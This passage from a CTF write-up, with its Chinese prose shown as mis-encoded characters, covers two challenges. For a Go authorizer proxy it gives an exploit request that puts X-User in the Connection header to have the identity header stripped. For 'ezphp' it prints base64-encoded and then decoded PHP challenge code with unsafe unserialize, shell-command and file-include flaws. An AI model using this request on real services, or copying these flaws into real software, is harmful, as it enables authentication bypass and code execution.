ä¹Ÿæ˜¯éšæœºçš„</p><p>è§‚å¯Ÿä¸€ä¸‹ X-User çš„ä½œç”¨</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">authorizer <span class="token operator">:=</span> <span class="token operator">&amp;</span>httputil<span class="token punctuation">.</span>ReverseProxy<span class="token punctuation">&#123;</span>Director<span class="token punctuation">:</span> <span class="token keyword">func</span><span class="token punctuation">(</span>req <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>Scheme <span class="token operator">=</span> <span class="token string">"http"</span>req<span class="token punctuation">.</span>URL<span class="token punctuation">.</span>Host <span class="token operator">=</span> <span class="token string">"127.0.0.1:5000"</span>uid <span class="token operator">:=</span> <span class="token function">GetUIDFromRequest</span><span class="token punctuation">(</span>req<span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"Request UID: %s, URL: %s"</span><span class="token punctuation">,</span> uid<span class="token punctuation">,</span> req<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">String</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Del</span><span class="token punctuation">(</span><span class="token string">"Authorization"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Del</span><span class="token punctuation">(</span><span class="token string">"X-User"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Del</span><span class="token punctuation">(</span><span class="token string">"X-Forwarded-For"</span><span class="token punctuation">)</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Del</span><span class="token punctuation">(</span><span class="token string">"Cookie"</span><span class="token punctuation">)</span><span class="token keyword">if</span> uid <span class="token operator">==</span> <span class="token string">""</span> <span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"X-User"</span><span class="token punctuation">,</span> <span class="token string">"anonymous"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>req<span class="token punctuation">.</span>Header<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"X-User"</span><span class="token punctuation">,</span> uid<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Authorizer middleware service is running at :5555"</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">":5555"</span><span class="token punctuation">,</span> authorizer<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è²Œä¼¼ä¸å¯æ§</p><p>çœ‹ä¸€ä¸‹ &#x2F;sign ç­¾åçš„æ–¹å¼</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">SignToken</span><span class="token punctuation">(</span>uid <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token builtin">string</span><span class="token punctuation">,</span> <span class="token builtin">error</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>t <span class="token operator">:=</span> jwt<span class="token punctuation">.</span><span class="token function">NewWithClaims</span><span class="token punctuation">(</span>jwt<span class="token punctuation">.</span>SigningMethodHS256<span class="token punctuation">,</span> AuthClaims<span class="token punctuation">&#123;</span>UID<span class="token punctuation">:</span> uid<span class="token punctuation">,</span>RegisteredClaims<span class="token punctuation">:</span> jwt<span class="token punctuation">.</span>RegisteredClaims<span class="token punctuation">&#123;</span>Issuer<span class="token punctuation">:</span>    <span class="token string">"Authorizer"</span><span class="token punctuation">,</span>Subject<span class="token punctuation">:</span>   uid<span class="token punctuation">,</span>ExpiresAt<span class="token punctuation">:</span> jwt<span class="token punctuation">.</span><span class="token function">NewNumericDate</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>Hour<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>IssuedAt<span class="token punctuation">:</span>  jwt<span class="token punctuation">.</span><span class="token function">NewNumericDate</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>NotBefore<span class="token punctuation">:</span> jwt<span class="token punctuation">.</span><span class="token function">NewNumericDate</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span><span class="token function">Now</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>tokenString<span class="token punctuation">,</span> err <span class="token operator">:=</span> t<span class="token punctuation">.</span><span class="token function">SignedString</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>SecretKey<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token string">""</span><span class="token punctuation">,</span> err<span class="token punctuation">&#125;</span><span class="token keyword">return</span> tokenString<span class="token punctuation">,</span> <span class="token boolean">nil</span><span class="token punctuation">&#125;</span>signRouter <span class="token operator">:=</span> mux<span class="token punctuation">.</span><span class="token function">NewRouter</span><span class="token punctuation">(</span><span class="token punctuation">)</span>signRouter<span class="token punctuation">.</span><span class="token function">HandleFunc</span><span class="token punctuation">(</span><span class="token string">"/sign"</span><span class="token punctuation">,</span> <span class="token keyword">func</span><span class="token punctuation">(</span>w http<span class="token punctuation">.</span>ResponseWriter<span class="token punctuation">,</span> r <span class="token operator">*</span>http<span class="token punctuation">.</span>Request<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token operator">!</span>strings<span class="token punctuation">.</span><span class="token function">HasPrefix</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>RemoteAddr<span class="token punctuation">,</span> <span class="token string">"127.0.0.1:"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>http<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token string">"Forbidden"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusForbidden<span class="token punctuation">)</span><span class="token punctuation">&#125;</span>uid <span class="token operator">:=</span> r<span class="token punctuation">.</span>URL<span class="token punctuation">.</span><span class="token function">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Get</span><span class="token punctuation">(</span><span class="token string">"uid"</span><span class="token punctuation">)</span>token<span class="token punctuation">,</span> err <span class="token operator">:=</span> <span class="token function">SignToken</span><span class="token punctuation">(</span>uid<span class="token punctuation">)</span><span class="token keyword">if</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Printf</span><span class="token punctuation">(</span><span class="token string">"Failed to sign token: %v"</span><span class="token punctuation">,</span> err<span class="token punctuation">)</span>http<span class="token punctuation">.</span><span class="token function">Error</span><span class="token punctuation">(</span>w<span class="token punctuation">,</span> <span class="token string">"Failed to generate token"</span><span class="token punctuation">,</span> http<span class="token punctuation">.</span>StatusInternalServerError<span class="token punctuation">)</span><span class="token keyword">return</span><span class="token punctuation">&#125;</span>w<span class="token punctuation">.</span><span class="token function">Write</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token function">byte</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Methods</span><span class="token punctuation">(</span><span class="token string">"GET"</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span><span class="token function">Println</span><span class="token punctuation">(</span><span class="token string">"Sign service is running at 127.0.0.1:4444"</span><span class="token punctuation">)</span><span class="token keyword">go</span> <span class="token keyword">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> err <span class="token operator">:=</span> http<span class="token punctuation">.</span><span class="token function">ListenAndServe</span><span class="token punctuation">(</span><span class="token string">"127.0.0.1:4444"</span><span class="token punctuation">,</span> signRouter<span class="token punctuation">)</span><span class="token punctuation">;</span> err <span class="token operator">!=</span> <span class="token boolean">nil</span> <span class="token punctuation">&#123;</span>log<span class="token punctuation">.</span><span class="token function">Fatal</span><span class="token punctuation">(</span>err<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä¸è¿‡æ—¢ç„¶æ˜¯æ£€æµ‹è¯·æ±‚å¤´ï¼Œå¯ä»¥ä» RFC è§„èŒƒä¸Šå…¥æ‰‹</p><p>expï¼š</p><pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/dashboard</span> <span class="token http-version property">HTTP/1.1</span></span><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:5555</span></span><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36</span></span><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close,X-User</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="PTerï¼ˆUnsolvedï¼‰"><a href="#PTerï¼ˆUnsolvedï¼‰" class="headerlink" title="PTerï¼ˆUnsolvedï¼‰"></a>PTerï¼ˆUnsolvedï¼‰</h1><hr><h1 id="ezphpï¼ˆUnsolvedï¼‰"><a href="#ezphpï¼ˆUnsolvedï¼‰" class="headerlink" title="ezphpï¼ˆUnsolvedï¼‰"></a>ezphpï¼ˆUnsolvedï¼‰</h1><p>wp éœ€æä¾›è¯¦ç»†çš„è°ƒè¯•è¿‡ç¨‹ï¼Œé‚£ä¹ˆå¾ˆæ˜æ˜¾ä¼šå’Œ php åº•å±‚æœ‰å…³ï¼ˆåº•å±‚é¢˜è¿™ä¹ˆå¤šè§£å¯¹å—ï¼‰</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'ZnVuY3Rpb24gZ2VuZXJhdGVSYW5kb21TdHJpbmcoJGxlbmd0aCA9IDgpeyRjaGFyYWN0ZXJzID0gJ2FiY2RlZmdoaWprbG1ub3BxcnN0dXZ3eHl6JzskcmFuZG9tU3RyaW5nID0gJyc7Zm9yICgkaSA9IDA7ICRpIDwgJGxlbmd0aDsgJGkrKykgeyRyID0gcmFuZCgwLCBzdHJsZW4oJGNoYXJhY3RlcnMpIC0gMSk7JHJhbmRvbVN0cmluZyAuPSAkY2hhcmFjdGVyc1skcl07fXJldHVybiAkcmFuZG9tU3RyaW5nO31kYXRlX2RlZmF1bHRfdGltZXpvbmVfc2V0KCdBc2lhL1NoYW5naGFpJyk7Y2xhc3MgdGVzdHtwdWJsaWMgJHJlYWRmbGFnO3B1YmxpYyAkZjtwdWJsaWMgJGtleTtwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKXskdGhpcy0+cmVhZGZsYWcgPSBuZXcgY2xhc3Mge3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgpe2lmIChpc3NldCgkX0ZJTEVTWydmaWxlJ10pICYmICRfRklMRVNbJ2ZpbGUnXVsnZXJyb3InXSA9PSAwKSB7JHRpbWUgPSBkYXRlKCdIaScpOyRmaWxlbmFtZSA9ICRHTE9CQUxTWydmaWxlbmFtZSddOyRzZWVkID0gJHRpbWUgLiBpbnR2YWwoJGZpbGVuYW1lKTttdF9zcmFuZCgkc2VlZCk7JHVwbG9hZERpciA9ICd1cGxvYWRzLyc7JGZpbGVzID0gZ2xvYigkdXBsb2FkRGlyIC4gJyonKTtmb3JlYWNoICgkZmlsZXMgYXMgJGZpbGUpIHtpZiAoaXNfZmlsZSgkZmlsZSkpIHVubGluaygkZmlsZSk7fSRyYW5kb21TdHIgPSBnZW5lcmF0ZVJhbmRvbVN0cmluZyg4KTskbmV3RmlsZW5hbWUgPSAkdGltZSAuICcuJyAuICRyYW5kb21TdHIgLiAnLicgLiAnanBnJzskR0xPQkFMU1snZmlsZSddID0gJG5ld0ZpbGVuYW1lOyR1cGxvYWRlZEZpbGUgPSAkX0ZJTEVTWydmaWxlJ11bJ3RtcF9uYW1lJ107JHVwbG9hZFBhdGggPSAkdXBsb2FkRGlyIC4gJG5ld0ZpbGVuYW1lOyBpZiAoc3lzdGVtKCJjcCAiLiR1cGxvYWRlZEZpbGUuIiAiLiAkdXBsb2FkUGF0aCkpIHtlY2hvICJzdWNjZXNzIHVwbG9hZCEiO30gZWxzZSB7ZWNobyAiZXJyb3IiO319fXB1YmxpYyBmdW5jdGlvbiBfX3dha2V1cCgpe3BocGluZm8oKTt9cHVibGljIGZ1bmN0aW9uIHJlYWRmbGFnKCl7ZnVuY3Rpb24gcmVhZGZsYWcoKXtpZiAoaXNzZXQoJEdMT0JBTFNbJ2ZpbGUnXSkpIHskZmlsZSA9ICRHTE9CQUxTWydmaWxlJ107JGZpbGUgPSBiYXNlbmFtZSgkZmlsZSk7aWYgKHByZWdfbWF0Y2goJy86XC9cLy8nLCAkZmlsZSkpZGllKCJlcnJvciIpOyRmaWxlX2NvbnRlbnQgPSBmaWxlX2dldF9jb250ZW50cygidXBsb2Fkcy8iIC4gJGZpbGUpO2lmIChwcmVnX21hdGNoKCcvPFw/fFw6XC9cL3xwaHxcP1w9L2knLCAkZmlsZV9jb250ZW50KSkge2RpZSgiSWxsZWdhbCBjb250ZW50IGRldGVjdGVkIGluIHRoZSBmaWxlLiIpO31pbmNsdWRlKCJ1cGxvYWRzLyIgLiAkZmlsZSk7fX19fTt9cHVibGljIGZ1bmN0aW9uIF9fZGVzdHJ1Y3QoKXskZnVuYyA9ICR0aGlzLT5mOyRHTE9CQUxTWydmaWxlbmFtZSddID0gJHRoaXMtPnJlYWRmbGFnO2lmICgkdGhpcy0+a2V5ID09ICdjbGFzcycpbmV3ICRmdW5jKCk7ZWxzZSBpZiAoJHRoaXMtPmtleSA9PSAnZnVuYycpIHskZnVuYygpO30gZWxzZSB7aGlnaGxpZ2h0X2ZpbGUoJ2luZGV4LnBocCcpO319fSRzZXIgPSBpc3NldCgkX0dFVFsnbGFuZCddKSA/ICRfR0VUWydsYW5kJ10gOiAnTzo0OiJ0ZXN0IjpOJztAdW5zZXJpYWxpemUoJHNlcik7'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è§£ç å¾—åˆ°</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">generateRandomString</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$characters</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyz'</span><span class="token punctuation">;</span><span class="token variable">$randomString</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$r</span> <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$characters</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$randomString</span> <span class="token operator">.=</span> <span class="token variable">$characters</span><span class="token punctuation">[</span><span class="token variable">$r</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">return</span> <span class="token variable">$randomString</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">date_default_timezone_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Asia/Shanghai'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">test</span><span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token variable">$readflag</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$f</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token variable">$key</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">readflag</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">class</span> <span class="token punctuation">&#123;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'error'</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$time</span> <span class="token operator">=</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Hi'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$seed</span> <span class="token operator">=</span> <span class="token variable">$time</span> <span class="token operator">.</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$seed</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$uploadDir</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'uploads/'</span><span class="token punctuation">;</span><span class="token variable">$files</span> <span class="token operator">=</span> <span class="token function">glob</span><span class="token punctuation">(</span><span class="token variable">$uploadDir</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'*'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$files</span> <span class="token keyword">as</span> <span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$randomStr</span> <span class="token operator">=</span> <span class="token function">generateRandomString</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$newFilename</span> <span class="token operator">=</span> <span class="token variable">$time</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token variable">$randomStr</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'.'</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'jpg'</span><span class="token punctuation">;</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$newFilename</span><span class="token punctuation">;</span><span class="token variable">$uploadedFile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$uploadPath</span> <span class="token operator">=</span> <span class="token variable">$uploadDir</span> <span class="token operator">.</span> <span class="token variable">$newFilename</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cp "</span><span class="token operator">.</span><span class="token variable">$uploadedFile</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span> <span class="token variable">$uploadPath</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"success upload!"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"error"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">function</span> <span class="token function-definition function">readflag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/:\/\//'</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$file_content</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"uploads/"</span> <span class="token operator">.</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/&lt;\?|\:\/\/|ph|\?\=/i'</span><span class="token punctuation">,</span> <span class="token variable">$file_content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Illegal content detected in the file."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"uploads/"</span> <span class="token operator">.</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$func</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">f</span><span class="token punctuation">;</span><span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">readflag</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'class'</span><span class="token punctuation">)</span><span class="token keyword">new</span> <span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">key</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'func'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$ser</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'land'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'land'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string single-quoted-string">'O:4:"test":N'</span><span class="token punctuation">;</span>@<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$ser</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æ ¼å¼åŒ–åå¾—åˆ°</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">function</span> <span class="token function-definition function">generateRandomString</span><span class="token punctuation">(</span><span class="token variable">$length</span> <span class="token operator">=</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$characters</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'abcdefghijklmnopqrstuvwxyz'</span><span class="token punctuation">;</span>    <span class="token variable">$randomString</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$length</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> 